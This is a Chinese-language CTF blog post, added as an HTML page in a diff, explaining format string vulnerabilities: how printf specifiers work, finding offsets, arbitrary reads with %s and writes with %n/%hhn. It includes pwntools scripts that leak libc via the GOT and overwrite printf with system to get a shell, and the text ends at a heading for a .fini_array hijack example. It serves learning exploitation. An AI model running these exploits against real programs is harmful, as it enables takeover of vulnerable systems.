@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="VnNixUxQwNBvFc-nAdXdfYkKhdk4ncl53flMSHEm1gw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="格式化字符串漏洞全面总结格式化字符串漏洞是 Pwn 中一种极其灵活、威力巨大的漏洞。它不需要栈溢出，只要开发者在使用输出函数时“偷了懒”，攻击者就能利用它实现任意内存读取和任意内存修改。  基础知识（格式化字符串）：这里我们了解一下格式化字符串的格式，其基本格式如下 %[parameter][flags][field width][.precision][length]type     组成部分">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞 (Format String)">
+<meta property="og:url" content="http://example.com/2026/03/19/PWN/pwn_attack/format_string/fmt_string%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="s0m1ng">
+<meta property="og:description" content="格式化字符串漏洞全面总结格式化字符串漏洞是 Pwn 中一种极其灵活、威力巨大的漏洞。它不需要栈溢出，只要开发者在使用输出函数时“偷了懒”，攻击者就能利用它实现任意内存读取和任意内存修改。  基础知识（格式化字符串）：这里我们了解一下格式化字符串的格式，其基本格式如下 %[parameter][flags][field width][.precision][length]type     组成部分">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-03-19T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-14T13:30:51.412Z">
+<meta property="article:author" content="s0m1ng">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="格式化字符串">
+<meta property="article:tag" content="fmtstr">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/03/19/PWN/pwn_attack/format_string/fmt_string%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>格式化字符串漏洞 (Format String) | s0m1ng</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="s0m1ng" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">s0m1ng</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制学习中</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+  <a href="https://github.com/som1ng" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/19/PWN/pwn_attack/format_string/fmt_string%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/profile_photo.jpg">
+      <meta itemprop="name" content="s0m1ng">
+      <meta itemprop="description" content="学习逆向贵在坚持">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0m1ng">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          格式化字符串漏洞 (Format String)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-03-19 10:00:00" itemprop="dateCreated datePublished" datetime="2026-03-19T10:00:00+08:00">2026-03-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-14 21:30:51" itemprop="dateModified" datetime="2026-03-14T21:30:51+08:00">2026-03-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/PWN-ATTACK/" itemprop="url" rel="index"><span itemprop="name">PWN_ATTACK</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/PWN-ATTACK/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" itemprop="url" rel="index"><span itemprop="name">格式化字符串</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+  
+  <h1 id="格式化字符串漏洞全面总结"><a href="#格式化字符串漏洞全面总结" class="headerlink" title="格式化字符串漏洞全面总结"></a>格式化字符串漏洞全面总结</h1><p>格式化字符串漏洞是 Pwn 中一种极其灵活、威力巨大的漏洞。它不需要栈溢出，只要开发者在使用输出函数时“偷了懒”，攻击者就能利用它实现<strong>任意内存读取</strong>和<strong>任意内存修改</strong>。 </p>
+<h2 id="基础知识（格式化字符串）："><a href="#基础知识（格式化字符串）：" class="headerlink" title="基础知识（格式化字符串）："></a>基础知识（格式化字符串）：</h2><p>这里我们了解一下格式化字符串的格式，其基本格式如下</p>
+<p><code>%[parameter][flags][field width][.precision][length]type</code></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>组成部分</th>
+<th>符号与写法</th>
+<th>含义与实战场景 (算法/Pwn)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>parameter</strong></td>
+<td><code>n$</code></td>
+<td><strong>(Pwn 绝对核心)</strong> 取第 <code>n</code> 个参数。例如 <code>%6$p</code></td>
+</tr>
+<tr>
+<td><strong>flags</strong></td>
+<td><code>-</code></td>
+<td>左对齐。默认是右对齐，算法竞赛打印矩阵常用。</td>
+</tr>
+<tr>
+<td></td>
+<td><code>+</code></td>
+<td>强制显示正负号（正数前加 <code>+</code>）。</td>
+</tr>
+<tr>
+<td></td>
+<td><code>0</code></td>
+<td>空位用 <code>0</code> 填充（默认用空格）。<strong>算法：</strong>打印时间 <code>09:05</code> 用 <code>%02d</code>；<strong>Pwn：</strong>用 <code>%012d</code> 快速造出特定长度的数据。</td>
+</tr>
+<tr>
+<td></td>
+<td><code>#</code></td>
+<td>八进制前自动加 <code>0</code>，十六进制前自动加 <code>0x</code>。</td>
+</tr>
+<tr>
+<td><strong>width</strong></td>
+<td><code>数字</code></td>
+<td>最小输出宽度。例如 <code>%5d</code>，即使数字是 1，也会输出 4 个空格 + 1 个 1。</td>
+</tr>
+<tr>
+<td><strong>.precision</strong></td>
+<td><code>.数字</code></td>
+<td><strong>(算法高频)</strong> 浮点数保留几位小数（会自动四舍五入），如 <code>%.5f</code>。如果是给字符串用 <code>%.5s</code>，则代表最多只输出 5 个字符。</td>
+</tr>
+<tr>
+<td><strong>length</strong></td>
+<td><code>hh</code> / <code>h</code></td>
+<td>修饰长度：<code>hh</code> 是单字节 (char)，<code>h</code> 是双字节 (short)。<strong>Pwn 中配合 <code>%n</code> 极其常用 (<code>%hhn</code>)，用于逐字节修改大地址。</strong></td>
+</tr>
+<tr>
+<td></td>
+<td><code>l</code> / <code>ll</code></td>
+<td>修饰长度：<code>l</code> 是 long，<code>ll</code> 是 long long。</td>
+</tr>
+<tr>
+<td></td>
+<td><code>z</code></td>
+<td>用于 <code>size_t</code> 类型数据，在 64 位下等价于无符号 64 位整型。</td>
+</tr>
+<tr>
+<td><strong>type</strong></td>
+<td><code>d</code>/<code>i</code>, <code>u</code></td>
+<td>十进制有符号整数 / 无符号整数。</td>
+</tr>
+<tr>
+<td></td>
+<td><code>f</code>, <code>lf</code></td>
+<td>浮点数 (<code>float</code> 用 <code>%f</code>，<code>double</code> 用 <code>%lf</code>)。</td>
+</tr>
+<tr>
+<td></td>
+<td><code>x</code>/<code>X</code>, <code>o</code></td>
+<td>16 进制小写/大写，8 进制无符号数。</td>
+</tr>
+<tr>
+<td></td>
+<td><code>s</code>, <code>c</code></td>
+<td>字符串，单个字符。</td>
+</tr>
+<tr>
+<td></td>
+<td><code>p</code></td>
+<td>打印内存地址指针 (自带 0x 前缀)。<strong>Pwn</strong>用于泄露栈上地址 <code>%p</code>。</td>
+</tr>
+<tr>
+<td></td>
+<td><code>n</code></td>
+<td>不输出字符，而是将<strong>目前为止成功打印的字符总数</strong>，写入对应的指针变量中</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="Pwn-漏洞利用核心组合"><a href="#Pwn-漏洞利用核心组合" class="headerlink" title="Pwn 漏洞利用核心组合"></a>Pwn 漏洞利用核心组合</h2><p>在 Pwn 领域，我们把上面的参数像魔法一样组合，化身为内存操控工具。</p>
+<ul>
+<li><p><strong>核心组合一：基础读取与参数定位 (<code>parameter</code> + <code>type</code>)</strong></p>
+<ul>
+<li><p><strong>例子</strong>：<code>%6$p</code></p>
+</li>
+<li><p><strong>实战含义</strong>：直接打印出栈上第 6 个参数的值。这让我们能够越过前面的垃圾数据，精准泄露远处的某一个地址。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>核心组合二：精准控制写入长度 (<code>parameter</code> + <code>length</code> + <code>type</code>)</strong></p>
+<ul>
+<li><p><strong>例子</strong>：<code>%8$hhn</code></p>
+</li>
+<li><p><strong>实战含义</strong>：向栈上第 8 个参数所指向的地址里，仅仅写入<strong>一个单字节的数据</strong>。由于一次性用 <code>%n</code> 写几百万的大数字会导致程序崩溃或等待极长，使用 <code>%hhn</code> 逐字节写入是改写大地址的最高端打法。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>核心组合三：用宽度造数据，用 %n 写内存 (<code>width</code> + <code>parameter</code> + <code>n</code>)</strong></p>
+<ul>
+<li><p><strong>例子</strong>：<code>%012d%6$n</code> (结合你的 <code>w_stack_addr.py</code> 笔记)</p>
+</li>
+<li><p><strong>执行逻辑</strong>：先执行 <code>%012d</code>，强制 <code>printf</code> 在屏幕上打印了 12 个字符。紧接着遇到 <code>%6$n</code>，<code>printf</code> 内部计数器数了一下刚才一共打印了 12 个字符，于是把数字 <code>12</code> (即十六进制的 <code>0xc</code>) 写入到了第 6 个参数指向的内存地址中。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="【泄露速查表】到底哪些格式符会“解引用”？"><a href="#【泄露速查表】到底哪些格式符会“解引用”？" class="headerlink" title="【泄露速查表】到底哪些格式符会“解引用”？"></a>【泄露速查表】到底哪些格式符会“解引用”？</h2><p>解引用的意味着它把参数当<strong>指针</strong>处理，否则意味着它只把参数当<strong>数值</strong>处理。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>格式符</th>
+<th>是否解引用</th>
+<th>作用原理</th>
+<th>漏洞利用用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>%s</code></strong></td>
+<td><strong>是</strong></td>
+<td>读取指针指向的字符串</td>
+<td><strong>泄露远端内存内容（如泄露 GOT 表）</strong></td>
+</tr>
+<tr>
+<td><strong><code>%n</code></strong></td>
+<td><strong>是</strong></td>
+<td>向指针指向的位置写入总字符数</td>
+<td><strong>修改内存（如劫持 GOT 表、改判断标志）</strong></td>
+</tr>
+<tr>
+<td><strong><code>%hn</code></strong></td>
+<td><strong>是</strong></td>
+<td>同 <code>%n</code>，但只写 2 字节</td>
+<td>精确修改内存 (配合分批写入绕过崩溃)</td>
+</tr>
+<tr>
+<td><strong><code>%hhn</code></strong></td>
+<td><strong>是</strong></td>
+<td>同 <code>%n</code>，但只写 1 字节</td>
+<td><strong>更精确修改内存 (fmtstr_payload的底层核心)</strong></td>
+</tr>
+<tr>
+<td><strong><code>%p</code></strong></td>
+<td><strong>否</strong></td>
+<td>原样输出指针所在的数值</td>
+<td><strong>寻找参数偏移</strong>、泄露栈上残留地址</td>
+</tr>
+<tr>
+<td><strong><code>%d</code></strong></td>
+<td><strong>否</strong></td>
+<td>原样输出整数</td>
+<td>配合控制输出宽度 (<code>%012d</code>) 辅助 <code>%n</code> 写数字</td>
+</tr>
+<tr>
+<td><strong><code>%x</code></strong></td>
+<td><strong>否</strong></td>
+<td>原样输出十六进制</td>
+<td>同 <code>%p</code>，用于寻找参数偏移</td>
+</tr>
+<tr>
+<td><strong><code>%c</code></strong></td>
+<td><strong>否</strong></td>
+<td>原样输出字符</td>
+<td>也是用于控制输出宽度</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h1 id="格式化字符串漏洞："><a href="#格式化字符串漏洞：" class="headerlink" title="格式化字符串漏洞："></a>格式化字符串漏洞：</h1><p>漏洞的根源在于：<strong>程序将用户可控的输入，直接作为了格式化字符串函数的参数。</strong></p>
+<p><strong>经典漏洞代码：</strong></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);  <span class="comment">// 绝对危险！开发者偷懒没有写 printf(&quot;%s&quot;, buf);</span></span><br></pre></td></tr></table></figure>
+<p>除了 <code>printf</code>，这类函数还包括：<code>sprintf</code>, <code>fprintf</code>, <code>snprintf</code>, <code>vprintf</code> 等。只要你能控制这些函数的<strong>第一个参数</strong>（格式化字符串），就能触发该漏洞。</p>
+<p><strong>格式化字符串的四种核心用途</strong>:</p>
+<p>格式化字符串漏洞可以精准划分为四大实战用途：</p>
+<h2 id="用途一：泄露栈上数据-寻找参数偏移"><a href="#用途一：泄露栈上数据-寻找参数偏移" class="headerlink" title="用途一：泄露栈上数据 / 寻找参数偏移"></a>用途一：泄露栈上数据 / 寻找参数偏移</h2><p>这是利用漏洞的第一步，通过输入特定的格式符，强迫 <code>printf</code> 打印出栈上的内容，从而找到我们输入的 payload 在栈上的第几个参数位置。</p>
+<p><strong>方法</strong>：输入 <code>AAAA.%x.%x.%x.%x.%x.%x...</code> 或 <code>AAAA.%p.%p.%p...</code></p>
+<p><strong>原理</strong>：<code>%x</code> 或 <code>%p</code> 会依次打印出栈上的值。当我们看到输出中出现了 <code>41414141</code> (<code>AAAA</code> 的十六进制)，数一下它是第几个打印出来的，这就是<strong>偏移量 (offset)</strong>。</p>
+<p><strong>示例</strong>：如果输出是 <code>deadbeef.0.1.41414141.2.3</code>，<code>41414141</code> 是第 4 个被打印的，说明偏移量就是 <code>4</code>。如果你想用 %s 泄露，这里就用 %4$s</p>
+<h2 id="用途二：读取任意地址内存"><a href="#用途二：读取任意地址内存" class="headerlink" title="用途二：读取任意地址内存"></a>用途二：读取任意地址内存</h2><p>找到偏移后，我们可以配合 <code>%s</code> 格式符，读取任意给定内存地址里的内容。常用来泄露 libc 基址或 GOT 表真实地址。</p>
+<p><strong>方法</strong>：利用 <code>%[offset]$s</code> 格式符。</p>
+<p><strong>实战代码</strong> (<code>read_stack_data.py</code> &amp; <code>r_every_mem.md</code>)：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设偏移是 6，要泄露 0x0804a020 地址内的数据</span></span><br><span class="line"><span class="comment"># 注意：为了防止 0x0804a020 中的 \x00 截断 printf，地址必须放在后面！</span></span><br><span class="line">payload = <span class="string">b&quot;%6$saaaa&quot;</span> + p32(<span class="number">0x0804a020</span>) </span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>
+<h2 id="用途三：改写栈上变量-写小数据"><a href="#用途三：改写栈上变量-写小数据" class="headerlink" title="用途三：改写栈上变量 / 写小数据"></a>用途三：改写栈上变量 / 写小数据</h2><p>利用 <code>%n</code> 格式符，<code>printf</code> 不仅能“读”，还能“写”。<code>%n</code> 会将<strong>目前为止成功打印的字符个数</strong>，写入到对应的指针地址中。</p>
+<p><strong>方法</strong>：构造特定长度的打印输出配合 <code>%n</code>。</p>
+<p><strong>实战代码</strong> (<code>w_stack_addr.py</code>)：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设我们要把栈上的某个地址修改为数值 16 (0x10)，偏移是 6</span></span><br><span class="line"><span class="comment"># p32 占 4 个字节，%012d 打印 12 个字符，总计 16 个字符。</span></span><br><span class="line"><span class="comment"># 然后遇到 %6$n，就会把 16 写入到 p32(c_addr) 指向的内存中。</span></span><br><span class="line">payload = p32(c_addr) + <span class="string">b&#x27;%012d&#x27;</span> + <span class="string">b&#x27;%6$n&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="用途四：覆写任意地址-劫持-GOT-表获取-Shell"><a href="#用途四：覆写任意地址-劫持-GOT-表获取-Shell" class="headerlink" title="用途四：覆写任意地址 / 劫持 GOT 表获取 Shell"></a>用途四：覆写任意地址 / 劫持 GOT 表获取 Shell</h2><p>由于一次性打印几百万个字符会导致程序崩溃，所以我们通常利用 pwntools 的大杀器 <code>fmtstr_payload</code> 或者按字节分批写入 (<code>%hhn</code>)</p>
+<p>一般格式化字符串没办法获取shell，但是可以借助got表来<strong>改写printf为system</strong>，再输入/bin/sh即可获取shell。</p>
+<p><strong>劫持 GOT 获取 Shell 实战</strong> (<code>fmt_getshell.md</code>)：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 1. 计算偏移并获取需要劫持的 GOT 表地址</span></span><br><span class="line">adr_print_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 先利用 %s 泄露 printf 的真实地址，算出 libc 基址和 system 地址</span></span><br><span class="line"><span class="comment"># 假设之前测出偏移量为 6。%7$s 需要凑齐 8 字节对齐，所以加上 aaaa</span></span><br><span class="line"><span class="comment"># 这样 p64(adr_print_got) 就刚刚好落在第 7 个参数的位置</span></span><br><span class="line">payload_leak = <span class="string">b&quot;%7$saaaa&quot;</span> + p64(adr_print_got)</span><br><span class="line">io.sendline(payload_leak)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收 64 位下的真实地址 (通常为 6 个字节有效地址)，并解包</span></span><br><span class="line">true_adr_print = u64(io.recvuntil(<span class="string">b&#x27;aaaa&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] 泄露的 printf 真实地址:&#x27;</span>, <span class="built_in">hex</span>(true_adr_print))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用泄露出来的真实地址减去 libc 中 printf 的静态偏移，得到 libc 基址</span></span><br><span class="line">libc_base = true_adr_print - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] 计算出的 libc 基址:&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺藤摸瓜算出 system 函数的绝对地址</span></span><br><span class="line">adr_system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 终极奥义：使用 fmtstr_payload 修改 GOT 表</span></span><br><span class="line"><span class="comment"># fmtstr_payload(偏移量, &#123;要修改的目标地址: 修改后的新内容&#125;)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;adr_print_got: adr_system&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 此时 printf 已经变成了 system。再次向程序输入 /bin/sh</span></span><br><span class="line"><span class="comment"># 程序执行 printf(&quot;/bin/sh&quot;) 实际上变成了 system(&quot;/bin/sh&quot;)</span></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong><code>fmtstr_payload</code> 生成的 Payload 到底有多长？如果程序输入限制在 50 字节以内怎么办？</strong></p>
+<ul>
+<li><p><strong>32位系统下</strong>：大约需要 <strong>40 ~ 50 字节</strong>。</p>
+</li>
+<li><p><strong>64位系统下</strong>：通常需要 <strong>80 ~ 120 字节</strong>！</p>
+</li>
+</ul>
+<p>Pwntools 提供了一个黄金参数：<strong><code>write_size=&#39;short&#39;</code></strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认写法 (非常长)：</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;got: sys&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩打法 (极大缩短长度)：</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;got: sys&#125;, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="用途五（进阶）：劫持-fini-array-实现无限循环-破除-One-Shot-限制"><a href="#用途五（进阶）：劫持-fini-array-实现无限循环-破除-One-Shot-限制" class="headerlink" title="用途五（进阶）：劫持 .fini_array 实现无限循环 (破除 One-Shot 限制)"></a>用途五（进阶）：劫持 .fini_array 实现无限循环 (破除 One-Shot 限制)</h2><p><strong>使用场景</strong>：在很多高难度题目中，程序只调用了一次 <code>printf</code>，然后就直接 <code>exit()</code> 或者 <code>return 0</code> 退出了。但是拿 Shell 往往需要<strong>两步</strong>（第一步泄露 libc，第二步劫持 GOT 表）。一次机会怎么做两件事？</p>
+<p><strong>漏洞原理</strong>：在 Linux 的 ELF 可执行文件中，有一个叫 <strong><code>.fini_array</code></strong> 的段。这里面存放着一个函数指针数组。当 <code>main</code> 函数结束，程序准备退出时，系统会自动去遍历执行 <code>.fini_array</code> 里面存放的函数（用于清理善后工作）。</p>
+<p><strong>黑客魔法</strong>：既然我们在唯一的一次 <code>printf</code> 中拥有任意地址写的能力，我们不仅可以泄露 libc，还可以<strong>同时利用 <code>%n</code> 把 <code>.fini_array</code> 里的指针，强行改成 <code>main</code> 函数的地址！</strong></p>
+<p><strong>执行后果</strong>： <code>main</code> 函数结束 -&gt; 准备退出 -&gt; 查看 <code>.fini_array</code> -&gt; 发现里面写着 <code>main</code> 的地址 -&gt; <strong>再次执行 main 函数！</strong> 这样，你就硬生生地把一个“只能玩一次”的游戏，变成了一个无限死循环，想输入多少次 payload 就输入多少次</p>
+<p><strong>Pwntools 实战写法：</strong></p>
